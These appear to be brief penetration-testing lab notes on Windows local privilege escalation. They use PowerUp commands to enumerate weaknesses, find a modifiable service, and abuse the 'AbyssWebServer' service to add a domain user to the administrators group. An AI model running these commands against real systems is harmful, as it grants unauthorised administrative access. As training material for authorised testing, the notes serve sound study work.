[[Enumeration Start]]
```
Invoke-AllChecks
```
to add current user to admin group: 
find which service is modifiable 
```
Get-ModifiableService
```
here we found abyssWebServer therefore using:
==AbyssWebServer,== 
```
Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\<user>' -Verbose
```
